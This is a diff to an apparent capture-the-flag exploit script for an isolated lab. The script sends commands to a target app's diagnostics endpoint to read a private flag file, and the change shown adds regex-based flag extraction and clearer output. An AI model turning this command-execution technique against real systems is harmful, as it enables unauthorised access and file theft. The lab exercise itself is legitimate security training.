@@ -7,6 +7,7 @@ Authorized use only inside the isolated Operation Poisoned Pipeline lab.
 
 import argparse
 import json
+import re
 import sys
 import urllib.error
 import urllib.request
@@ -14,6 +15,8 @@ import urllib.request
 DEFAULT_TARGET = "http://nexora-app:5000"
 DIAGNOSTICS_PATH = "/api/diagnostics/run"
 DEFAULT_FLAG_PATH = "/opt/nexora/private/s04_flag.txt"
+
+FLAG_PATTERN = re.compile(r"IE3132\{PP_S04_[0-9a-f]{32}\}")
 
 
 def post_json(url, payload, timeout=20):
@@ -107,14 +110,18 @@ def main():
     body = run_command(args.target, command)
 
     if args.read_flag:
-        stdout = body.get("stdout", "").strip()
-        if stdout.startswith("IE3132{PP_S04_"):
+        stdout = body.get("stdout", "")
+        match = FLAG_PATTERN.search(stdout)
+        if match:
             print()
-            print("[+] S04 flag recovered.")
-            print("[+] Submit the token to CTFd.")
+            print("[+] S04 flag recovered:")
+            print(f"    {match.group(0)}")
+            print()
+            print("[+] Submit this token to CTFd.")
         else:
             print()
-            print("[!] Flag not found in stdout. Check the path and permissions.")
+            print("[!] Flag pattern not found in stdout.")
+            print("[!] Check the flag file path and permissions.")
             sys.exit(1)
 
     print()
